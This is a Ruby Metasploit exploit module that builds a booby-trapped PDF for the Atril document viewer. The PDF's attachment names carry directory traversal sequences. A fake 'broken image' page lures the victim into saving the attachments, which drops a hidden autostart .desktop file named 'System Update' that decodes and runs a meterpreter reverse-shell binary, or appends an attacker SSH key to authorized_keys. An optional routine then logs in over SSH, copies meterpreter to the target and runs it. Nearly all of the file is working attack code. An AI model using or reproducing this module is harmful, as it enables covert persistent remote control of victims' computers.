##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#
# by oxagast
#
##
# shell/ev-window.c:7667
# --- snip ---
#  if (is_native) {
#    if (is_dir) {
#      save_to = g_file_get_child (target_file,
#         ev_attachment_get_name (attachment));
#    } else {
#      save_to = g_object_ref (target_file);
# --- snip ---
##
##
# shell/ev-sidebar-attachments.c:424
# --- snip ---
#  gtk_tree_model_get_iter (GTK_TREE_MODEL (ev_attachbar->priv->model),
#        &iter, path);
#  gtk_tree_model_get (GTK_TREE_MODEL (ev_attachbar->priv->model), &iter,
#	 COLUMN_ATTACHMENT, &attachment,
#	 -1);
#  template = g_strdup_printf ("%s.XXXXXX", ev_attachment_get_name (attachment));
#  file = ev_mkstemp_file (template, &error);
#  g_free (template);
#  if (file != NULL && ev_attachment_save (attachment, file, &error)) {
#        gchar *uri;
# --- snip ---
##
## wuuuhhh?
# ░░░░░░░░░░░░░░░░░░░░░░   ████▓ ░░░░    ▓██████ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░░░░░░░░░ ▒░░░░  ▓███▓█▓ ░    █████░░▓██ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░   ░░░  ░█░ ░  ███   █░   ████     ▓▓█  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░ ██░    ▓██    ██▓   ░██████    ░  ███             ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░     ██▒  ██▓█   ███  ░ ▒█▓░    ░░░░ ▓█▒▒ ░▒▓▓█████▓▓▒ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░███░  ██ ▒█▓██  ██   ░░░     ░░░░░░░ █████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░  ░██    ███░  ░   ░░░░░░░░░░░░░░░░░              ▓█▓  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░  ████ ░     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ███   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░███▓░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ▒██▒   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ░████▓    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░████   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    █████    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░   ▒███  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     ████░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░    ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░   ░     ▒████░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░    ██  ░░░░░░░░░    ░░░░░░░░░░░░░░░░░░░░░░█▓    ████▒   ░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░    ▓█████ ░░░░░░░░░ ██    ░░░░░░░░░░░░░░░░░░░ ▒█████▒    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░ █████▒▒██ ░░░░░░░░░ █████   ░░░░░░░░░░░░░░░░░░  ░▓▓▓  ░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░ ▒█▒        ░░░░░░░░░ █▒▒▓███  ░░░░░░░░░░░░░░░░░░ ▒█▓ ░██ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░ ▓█  ░░░░░░░░░░   ░░░ █████ ██  ░░░░░░░░░░░░░░░░░ ██▓██   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░ ░██    ░░░░░░░ █     █      ▓█  ░░░░░░░░░░░░░░░  █░    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░  ████░    ░░  ████▒ ██░     ██    ░  ░░░░░░░░  ██ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░   ▓█████▓ ░  █▒  █  ░███    ▓▓ ▒█ ██░░░░░░░  ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░      ██ ░  █    ░░   ░████████▓█    ░░░░  ██░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░░░░░  █▓    ██ ░░░░░░░        ░██▓█▓   ░  ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░░░   ░████████▒  ░░░░░ ██ ░░░   ██▒ ██   ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░░░  ▒██       ███   ░░░ ██       █▒   ██▓█▓  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░░   ██████▓░░░    ██   ░  ██████████░   ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░░  ██░     ░ ░░░░░   ██      ░▒▒        █▓  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░░  ████████   ░░░░░░░  ████        ▒█  ██░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░░  █▓       ▓ █         █  ██████████  ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░░  ███████░    ████████████           ██   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░  █▒     ▒███▒ █          ████    ▓███   ░░░░░░░░           ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
#   ██░░         ░█ ▒█████████▓ ██████░   ░░░        ░░░░░░░░        ░░░░░░░░░░░░░░░░░░░░░░░░ 
#  ██░▓██████    ▓█▒         █░        ░░     ▒████████████████████▒     ░░░░░░░░░░░░░░░░░░░░ 
# ▓█        ░███ ██▓██████████  ░░░░░    ░█████                   █████▒   ░░░░░░░░░░░░░░░░░░ 
# █▓█████▓░      ██         ▒█ ░░░    ████▓      ░░░░░░░░░░░░░░░░    ▒████   ░░░░░░░░░░░░░░░░ 
# █░     ▓█████▓ ██░░░░░   ▒█▒     ████     ░░░░░░░░░░░░░░░░░░░░░░░░    ████  ░░░░░░░░░░░░░░░ 
#  ███████        ███████▓██    ████    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░   ███▒  ░░░░░░░░░  ░░ 
# ▒█     ░███████    ▒    █  ▒███    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ███▒ ░░░░░    ░    
# ██  ░░        ▓████░   █░███    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ▓██░ ░░░  ██████  
# ▒█     ░░░░░░     █  ████░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░        ███  ░░░████▒    
#  ██  █░           ▒▓ █    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      ▒███▓    ██▒ ░░     ▒███ 
#   ██░▒█▒▓▓▓▓█▓█▓▓▒▓█▓█  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ███▒ ██████   ██▓ ░░░ ▒███▒░▓ 
# ░ ▓████████████████████   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ░███     ▒██  ▓█▓ ░░          
# ░  ██   █    ░▓▓░    ████▓   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░              ▓█▒ ░ ░█████░░░ 
#     ▓████  ░█░  ██ ▓▓ █   ██ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████  ░░ ▓█▒ ░▓██░   ░░░ 
#  █████   █   █░  █        ██  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░   ▓███░░  █  ░░    ░░░░░ 
# ██     █████░░██████████  ░█      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     ░░░ █ ░░░░░░░░░░░░ 
# █     ██   ██       ██ ████ █████  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░░░░░░░░░░░░ 
# ██░  ██      ▒██████  ██ ██ █   ▓█▒ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
# ░█████████░                   ░███░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
#         ░████████▓▒░░ ░░░▓██████▓  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
#                                                                                             
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atril Directory Traversal in Attachment Saving RCE',
        'Description' => %q{
          This module exploits a directory traversal vulnerability in Atril
          (MATE Document Viewer) versions prior to 1.28.7. When opening a PDF
          with embedded file attachments, the attachment filenames are not
          properly sanitized, allowing directory traversal sequences (../) to
          write files outside the intended extraction directory.

          This exploit creates a PDF with embedded files:
          - PAYLOAD_TYPE=desktop: A .desktop file written to ~/.config/autostart/ for persistence + base64 encoded ELF payload
          - PAYLOAD_TYPE=shell: A shell script written to ~/.boom.sh that executes the payload
          - PAYLOAD_TYPE=raw: A custom raw payload file
          - PAYLOAD_TYPE=ssh_key: An SSH public key appended to ~/.ssh/authorized_keys (auto-generates key pair if not provided)

          The .desktop file will execute on the user's next login/reboot, achieving code execution.
          The SSH key variant allows persistent SSH access without requiring a listener.
          With AUTO_SSH enabled, the module will automatically attempt SSH connection,
          deploy a meterpreter payload via SCP, and execute it for a full interactive session.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Marshall Whittaker <marshall@oxasploits.com>', # Discovery and PoC
        ],
        'References' => [
          ['CVE', '2024-XXXX'], # Replace with actual CVE when available
          ['URL', 'https://gitlab.gnome.org/GNOME/atril/-/issues/XXX']
        ],
        'DefaultOptions' => {
          'EXITFUNC' => 'process',
          'DisablePayloadHandler' => true,
          'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
        },
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Payload' => {
          'Space' => 2000000,
          'DisableNops' => true,
        },
        'Targets' => [
          [
            'Atril <= 1.28.6 (Linux x64)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2026-10-19',
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, ACCOUNT_LOGOUT]
        }
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'The output PDF file name.', 'exploit.pdf']),
        OptEnum.new('VARIANT', [true, 'Directory traversal variant to use.',
          'relative-one-level', ['relative-one-level', 'relative-climb', 'absolute', 'shellrc', 'custom']]),
        OptString.new('CUSTOM_NAME', [false, 'Custom attachment name (used when VARIANT=custom).', '']),
        OptEnum.new('PAYLOAD_TYPE', [true, 'Type of payload to embed.',
          'desktop', ['desktop', 'shell', 'raw', 'ssh_key']]),
        OptString.new('PAYLOAD_FILE', [false, 'Raw payload file (used when PAYLOAD_TYPE=raw).', '']),
        OptString.new('EXEC_CMD', [false, 'Custom command for .desktop Exec= field.', '']),
        OptString.new('MARKER', [false, 'Marker filename for default payload.', '.atril-exploited.txt']),
        OptString.new('SCRIPT_NAME', [false, 'Name of the companion shell script.', '.boom.sh']),
        OptString.new('BASE_NAME', [false, 'Basename for the .desktop file.', 'statement.desktop']),
        OptString.new('SSH_PUBKEY', [false, 'SSH public key to drop in ~/.ssh/authorized_keys (used when PAYLOAD_TYPE=ssh_key).', '']),
        OptString.new('SSH_HOST', [false, 'Target host for SSH auto-connect (used with PAYLOAD_TYPE=ssh_key).', '']),
        OptString.new('SSH_USER', [false, 'SSH username for auto-connect.', '']),
        OptInt.new('SSH_PORT', [false, 'SSH port for auto-connect.', 22]),
        OptBool.new('AUTO_SSH', [false, 'Automatically attempt SSH connection and deploy meterpreter after key drop.', false]),
        OptString.new('METERPRETER_PAYLOAD', [false, 'Meterpreter payload to deploy via SCP (e.g., linux/x64/meterpreter_reverse_tcp).', 'linux/x64/meterpreter_reverse_tcp']),
        OptString.new('LHOST', [false, 'Listener IP for reverse shell (auto-detected if unset).', '']),
        OptInt.new('LPORT', [false, 'Listener port for reverse shell.', 4444]),
        OptEnum.new('SHELL_TYPE', [true, 'Type of shell payload to generate.',
          'cmd', ['cmd', 'meterpreter_reverse_tcp', 'meterpreter_reverse_http', 'meterpreter_reverse_https']]),
        OptString.new('PAYLOAD', [false, 'Custom MSF payload to use (overrides SHELL_TYPE).', ''])
      ], self.class
    )
  end

  def exploit
    pdf = make_pdf
    return if pdf.empty?
    file_create(pdf)
    print_status("Created '#{datastore['FILENAME']}' with embedded payload")
    
    if datastore['PAYLOAD_TYPE'] == 'ssh_key'
      print_status("When the victim opens this PDF in Atril <= 1.28.6 and saves attachments,")
      print_status("an SSH public key will be appended to ~/.ssh/authorized_keys")
      print_status("You can then SSH in with: ssh -i <private_key> user@target")
      print_status("The private key is NOT embedded - you must generate it separately or use the auto-generated one")
      
      # Auto-SSH connect and deploy meterpreter if enabled
      if datastore['AUTO_SSH']
        auto_ssh_deploy
      end
    else
      print_status("When the victim opens this PDF in Atril <= 1.28.6 and saves attachments,")
      print_status("the .desktop file will be written to ~/.config/autostart/")
      print_status("The .desktop file decodes base64 ELF, writes to ~/.cache/, chmods +x and executes on next login.")
      
      # Show listener info
      lhost = datastore['LHOST']
      lport = datastore['LPORT']
      if lhost.empty?
        lhost = Rex::Socket.source_address('50.50.50.50') rescue '0.0.0.0'
      end
      print_status("Start a listener with: use exploit/multi/handler")
      print_status("set PAYLOAD #{datastore['PAYLOAD']}")
      print_status("set LHOST #{lhost}")
      print_status("set LPORT #{lport}")
      print_status("run")
    end
  end
  
  def auto_ssh_deploy
    ssh_host = datastore['SSH_HOST']
    ssh_user = datastore['SSH_USER']
    ssh_port = datastore['SSH_PORT']
    meterpreter_payload = datastore['METERPRETER_PAYLOAD']
    
    if ssh_host.empty? || ssh_user.empty?
      print_error("SSH_HOST and SSH_USER are required for AUTO_SSH")
      return
    end
    
    # Get the private key (generated in make_pdf)
    private_key = @ssh_private_key
    if private_key.nil?
      print_error("No private key available. The key must be auto-generated (SSH_PUBKEY not set).")
      return
    end
    
    print_status("Waiting for SSH key to be accepted on #{ssh_user}@#{ssh_host}:#{ssh_port}...")
    print_status("This requires the victim to open the PDF and save attachments first.")
    print_status("Press Ctrl+C to stop waiting.")
    
    # Write private key to temp file for SSH auth
    key_file = "/tmp/ssh_key_#{Rex::Text.rand_text_alpha(8)}"
    File.write(key_file, private_key)
    File.chmod(0600, key_file)
    
    # Generate the meterpreter binary
    print_status("Generating meterpreter payload: #{meterpreter_payload}")
    pay = framework.payloads.create(meterpreter_payload)
    pay.datastore['LHOST'] = datastore['LHOST'] || Rex::Socket.source_address('50.50.50.50')
    pay.datastore['LPORT'] = datastore['LPORT']
    meterpreter_bin = pay.generate
    
    # Write to temp file
    temp_bin = "/tmp/meter_#{Rex::Text.rand_text_alpha(8)}"
    File.binwrite(temp_bin, meterpreter_bin)
    File.chmod(0755, temp_bin)
    
    # Start handler in background
    print_status("Starting meterpreter handler...")
    handler_thread = Thread.new do
      system("msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD #{meterpreter_payload}; set LHOST #{pay.datastore['LHOST']}; set LPORT #{pay.datastore['LPORT']}; run\"")
    end
    
    # Wait for SSH to become available
    max_attempts = 60
    attempt = 0
    ssh_success = false
    
    while attempt < max_attempts && !ssh_success
      attempt += 1
      print_status("Attempt #{attempt}/#{max_attempts}: Testing SSH connection...")
      
      # Test SSH connection with key
      cmd = "ssh -i #{key_file} -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p #{ssh_port} #{ssh_user}@#{ssh_host} 'echo SSH_OK' 2>&1"
      output = `#{cmd}`
      
      if $?.success? && output.include?('SSH_OK')
        print_good("SSH connection successful!")
        ssh_success = true
        
        # Copy meterpreter binary via SCP
        print_status("Copying meterpreter binary via SCP...")
        scp_cmd = "scp -i #{key_file} -P #{ssh_port} -o StrictHostKeyChecking=no #{temp_bin} #{ssh_user}@#{ssh_host}:~/meterpreter_bin 2>&1"
        scp_output = `#{scp_cmd}`
        
        if $?.success?
          print_good("Meterpreter binary copied successfully!")
          
          # Execute meterpreter on target
          print_status("Executing meterpreter on target...")
          exec_cmd = "ssh -i #{key_file} -o StrictHostKeyChecking=no -p #{ssh_port} #{ssh_user}@#{ssh_host} 'chmod +x ~/meterpreter_bin && nohup ~/meterpreter_bin > /dev/null 2>&1 &' 2>&1"
          exec_output = `#{exec_cmd}`
          
          if $?.success?
            print_good("Meterpreter executed on target! Waiting for session...")
          else
            print_error("Failed to execute meterpreter: #{exec_output}")
          end
        else
          print_error("SCP failed: #{scp_output}")
        end
      else
        sleep 5
      end
    end
    
    if !ssh_success
      print_error("SSH connection timed out after #{max_attempts} attempts")
      print_status("The victim may not have opened the PDF yet, or the key was not accepted.")
    end
    
    # Cleanup
    File.unlink(temp_bin) if File.exist?(temp_bin)
    File.unlink(key_file) if File.exist?(key_file)
    handler_thread.kill if handler_thread.alive?
  end

  def make_pdf
    # Get options
    variant = datastore['VARIANT']
    custom_name = datastore['CUSTOM_NAME']
    payload_type = datastore['PAYLOAD_TYPE']
    payload_file = datastore['PAYLOAD_FILE']
    exec_cmd = datastore['EXEC_CMD']
    marker = datastore['MARKER']
    script_name = datastore['SCRIPT_NAME']
    base_name = datastore['BASE_NAME']
    ssh_pubkey = datastore['SSH_PUBKEY']
    ssh_host = datastore['SSH_HOST']
    ssh_user = datastore['SSH_USER']
    ssh_port = datastore['SSH_PORT']
    auto_ssh = datastore['AUTO_SSH']
    meterpreter_payload = datastore['METERPRETER_PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    
    # Resolve the attachment name for the chosen variant
    home_dir = ENV['HOME'] || "/home/#{ENV['USER']}"
    
    # For the .desktop file
    desktop_name = base_name
    
    attach_name = case variant
    when 'relative-one-level'
      "../.config/autostart/#{desktop_name}"
    when 'relative-climb'
      ("../" * 12) + home_dir.sub(/^\//, '') + "/.config/autostart/#{desktop_name}"
    when 'absolute'
      "#{home_dir}/.config/autostart/#{desktop_name}"
    when 'shellrc'
      "../#{desktop_name}"
    when 'custom'
      custom_name.empty? ? "../.config/autostart/#{desktop_name}" : custom_name
    else
      "../.config/autostart/#{desktop_name}"
    end
    
    # Handle different payload types
    if payload_type == 'ssh_key'
      # SSH key payload - drop public key to ~/.ssh/authorized_keys
      # Auto-generate key pair if not provided
      @ssh_private_key = nil
      if ssh_pubkey.empty?
        print_status("Generating RSA key pair for SSH access...")
        require 'openssl'
        key = OpenSSL::PKey::RSA.new(2048)
        @ssh_private_key = key.to_pem
        
        # Convert to OpenSSH authorized_keys format
        # SSH wire format: string "ssh-rsa", mpint e, mpint n
        e = key.public_key.e
        n = key.public_key.n
        
        # Encode as SSH wire format
        def mpint_to_ssh(bn)
          # Convert OpenSSL::BN to SSH mpint format (big-endian, with leading zero if high bit set)
          bytes = bn.to_s(2)
          # Ensure positive representation
          if bytes[0].ord & 0x80 != 0
            bytes = "\x00" + bytes
          end
          [bytes.length].pack('N') + bytes
        end
        
        def string_to_ssh(str)
          [str.length].pack('N') + str
        end
        
        ssh_wire = string_to_ssh("ssh-rsa") + mpint_to_ssh(e) + mpint_to_ssh(n)
        ssh_pubkey_b64 = [ssh_wire].pack('m0')
        ssh_pubkey = "ssh-rsa #{ssh_pubkey_b64} atril-exploit-#{Rex::Text.rand_text_alpha(8)}"
        print_status("Generated SSH public key: #{ssh_pubkey[0..50]}...")
      end
      
      # Ensure the key ends with newline
      ssh_pubkey = ssh_pubkey.strip + "\n" unless ssh_pubkey.end_with?("\n")
      
      # For SSH key, the attachment IS the public key, saved directly to authorized_keys via path traversal
      attach_name = case variant
      when 'relative-one-level'
        "../.ssh/authorized_keys"
      when 'relative-climb'
        ("../" * 12) + home_dir.sub(/^\//, '') + "/.ssh/authorized_keys"
      when 'absolute'
        "#{home_dir}/.ssh/authorized_keys"
      when 'shellrc'
        "../.ssh/authorized_keys"
      when 'custom'
        custom_name.empty? ? "../.ssh/authorized_keys" : custom_name
      else
        "../.ssh/authorized_keys"
      end
      
      # The attachment data is just the SSH public key
      payloads = []
      payloads << { key: 'authorized_keys', name: attach_name, data: ssh_pubkey }
      
    else
      # Original ELF payload logic
      # Generate the MSF payload as an ELF binary
      # make sure we use the correct payload meterpreter_reverse_tcp?
      print_status("Generating MSF payload binary...")
      elf_payload = generate_payload_binary
      
      # Encode the ELF as base64 to avoid binary corruption in PDF
      # Just makes things a little cleaner
      require 'base64'
      elf_b64 = Base64.strict_encode64(elf_payload)
      print_status("Encoded ELF as base64: #{elf_b64.length} chars")
      
      # Filenames
      elf_name = ".cache/#{Rex::Text.rand_text_alpha(8)}"
      b64_name = ".cache/#{Rex::Text.rand_text_alpha(8)}.b64"
      
      # Resolve attachment names for the chosen variant
      home_dir = ENV['HOME'] || "/home/#{ENV['USER']}"
      
      attach_name = case variant
      when 'relative-one-level'
        "../.config/autostart/#{base_name}"
      when 'relative-climb'
        ("../" * 12) + home_dir.sub(/^\//, '') + "/.config/autostart/#{base_name}"
      when 'absolute'
        "#{home_dir}/.config/autostart/#{base_name}"
      when 'shellrc'
        "../#{base_name}"
      when 'custom'
        custom_name.empty? ? "../.config/autostart/#{base_name}" : custom_name
      else
        "../.config/autostart/#{base_name}"
      end
      
      # Base64 attachment name (goes to ~/.cache/)
      b64_attach_name = case variant
      when 'relative-one-level'
        "../.cache/#{File.basename(b64_name)}"
      when 'relative-climb'
        ("../" * 12) + home_dir.sub(/^\//, '') + "/#{b64_name}"
      when 'absolute'
        "#{home_dir}/#{b64_name}"
      when 'shellrc'
        "../#{File.basename(b64_name)}"
      when 'custom'
        custom_name.empty? ? "../.cache/#{File.basename(b64_name)}" : custom_name
      else
        "../.cache/#{File.basename(b64_name)}"
      end
      
      # Create the .desktop file that reads base64 from the saved file
      desktop_entry = "[Desktop Entry]\n"
      desktop_entry << "Type=Application\n"
      desktop_entry << "Name=System Update\n"
      desktop_entry << "Comment=System Update Service\n"
      desktop_entry << "Exec=sh -c 'base64 -d $HOME/#{b64_name} > $HOME/#{elf_name} && chmod +x $HOME/#{elf_name} && $HOME/#{elf_name}'\n"
      desktop_entry << "Terminal=false\n"
      desktop_entry << "NoDisplay=true\n"
      desktop_entry << "X-GNOME-Autostart-enabled=true\n"
      
      # Prepare payloads array - two attachments: .desktop and base64 file
      payloads = []
      payloads << { key: 'statement.txt', name: attach_name, data: desktop_entry }
      payloads << { key: 'update.b64', name: b64_attach_name, data: elf_b64 }
    end
    
    # Build the PDF manually to avoid PDF mixin issues
    # Initialize PDF structure
    @xref = {}
    @pdf = ''
    
    # Add PDF header
    @pdf << header
    
    # We'll build all objects in order, with catalog as object 1
    # But we need to know the catalog content first, so we'll build objects 2+ first,
    # then create catalog as object 1, then rebuild the PDF in correct order
    
    # Create page content stream with broken image placeholder and instructions
    content = "BT /F1 22 Tf 72 700 Td (Statement of Account) Tj ET\n"
    # Draw broken image placeholder: rectangle with X through it
    content << "72 580 200 150 re S\n"  # Rectangle outline
    content << "72 580 m 272 730 l S\n"  # Diagonal line 1 (top-left to bottom-right)
    content << "272 580 m 72 730 l S\n"  # Diagonal line 2 (bottom-left to top-right)
    # Broken image label
    content << "BT /F1 10 Tf 120 555 Td [broken image] Tj ET\n"
    # Instruction text
    content << "BT /F1 12 Tf 72 530 Td (If images look broken, save attachments and reopen the editor) Tj ET"
    
    # Build the PDF by writing directly to a binary file to avoid Ruby string corruption
    # Use a regular file instead of Tempfile to avoid any buffering issues
    pdf_path = "/tmp/msf_pdf_#{Process.pid}_#{Time.now.to_i}.pdf"
    pdf_file = File.open(pdf_path, 'wb')
    
    # Write PDF header
    pdf_file.write(header)
    
    # We'll build all objects in a hash first (object_num => content)
    # For binary streams, we'll store the binary data separately
    objects = {}
    binary_streams = {}  # object_num => binary_data
    
    # Object 2: Font
    objects[2] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
    
    # Object 3: Page content stream
    objects[3] = "<< /Length #{content.length} >>\nstream\n#{content}\nendstream"
    
    # Object 4: Pages
    objects[4] = "<< /Type /Pages /Kids [5 0 R] /Count 1 >>"
    
    # Object 5: Page
    objects[5] = "<< /Type /Page /Parent 4 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 2 0 R >> >> /Contents 3 0 R >>"
    
    # Objects for embedded files
    obj_num = 6
    ef_objects = []
    fs_objects = []
    
    payloads.each do |p|
      # Embedded file stream - store binary data separately
      ef_obj = obj_num
      objects[ef_obj] = "<< /Type /EmbeddedFile /Length #{p[:data].length} >>"
      binary_streams[ef_obj] = p[:data]
      obj_num += 1
      ef_objects << ef_obj
      
      # Filespec
      escaped_name = escape_pdf_string(p[:name])
      fs_obj = obj_num
      objects[fs_obj] = "<< /Type /Filespec /F (#{escaped_name}) /UF (#{escaped_name}) /EF << /F #{ef_obj} 0 R >> >>"
      obj_num += 1
      fs_objects << fs_obj
    end
    
    # EmbeddedFiles name tree
    names_entries = payloads.each_with_index.map do |p, i|
      "(#{p[:key]}) #{fs_objects[i]} 0 R"
    end.join(' ')
    
    names_obj = obj_num
    objects[names_obj] = "<< /Names [#{names_entries}] >>"
    obj_num += 1
    
    # Catalog (object 1) - must reference pages (4) and names tree
    catalog_content = "<< /Type /Catalog /Pages 4 0 R /PageMode /UseAttachments /Names << /EmbeddedFiles #{names_obj} 0 R >> >>"
    objects[1] = catalog_content
    
    # Document info
    info_obj = obj_num
    objects[info_obj] = "<< /Title (Statement of Account) /Producer (Atril Exploit) >>"
    
    # Now write all objects in order (1, 2, 3, ...) directly to the binary file
    (1..obj_num).each do |num|
      if objects[num]
        @xref[num] = pdf_file.pos
        pdf_file.write(io_def(num))
        
        if binary_streams[num]
          # Write stream object with binary data
          pdf_file.write(objects[num])
          pdf_file.write("\nstream\n")
          pdf_file.write(binary_streams[num])
          pdf_file.write("\nendstream\n")
        else
          pdf_file.write(objects[num])
        end
        
        pdf_file.write(endobj)
      end
    end
    
    # Ensure all data is flushed to disk
    pdf_file.flush
    pdf_file.fsync if pdf_file.respond_to?(:fsync)
    
    # Finish the PDF
    @xref_offset = pdf_file.pos
    pdf_file.write(xref_table)
    pdf_file.write(trailer(1))
    pdf_file.write(startxref)
    
    # Ensure all data is flushed
    pdf_file.flush
    # Don't leave the seat up
    pdf_file.fsync if pdf_file.respond_to?(:fsync)
    
    # Read the complete PDF
    pdf_file.close
    pdf_data = File.binread(pdf_path)
    File.unlink(pdf_path)
    
    pdf_data
  end
  
  def generate_payload_binary
    # Use the MSF payload system to generate an ELF binary
    # This uses the payload specified in the module's PAYLOAD option
    pay = payload_instance
    
    # Genbin bby!
    if pay.respond_to?(:generate)
      raw = pay.generate
    else
      raw = payload.encoded
    end
    
    # If it's a staged payload, we need to handle it differently
    # For now, return the raw payload
    raw
  end
  
  def escape_pdf_string(str)
    # Escape special characters for PDF string literals
    # Per PDF spec: escape \, (, ), and non-printable chars
    str.gsub('\\', '\\\\\\\\').gsub('(', '\\\\(').gsub(')', '\\\\)')
  end
end
